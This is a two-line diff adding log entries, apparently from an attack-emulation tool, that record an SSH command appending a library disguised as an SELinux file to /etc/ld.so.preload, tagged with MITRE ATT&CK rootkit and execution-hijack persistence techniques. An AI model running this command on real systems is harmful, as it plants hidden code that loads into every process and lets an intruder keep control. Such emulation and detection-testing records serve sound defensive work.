@@ -1,0 +1,2 @@
+2025-10-01 11:39:10 INFO - Executing SSH-Command: 'echo /usr/lib/selinux.so.3 >> /etc/ld.so.preload'
+2025-10-01 11:39:10 INFO - Metadata: {"techniques": "T1014,T1564,T1574", "tactics": "Persistence", "technique_name": "Rootkit,Hide Artifacts,Hijack Execution Flow"}
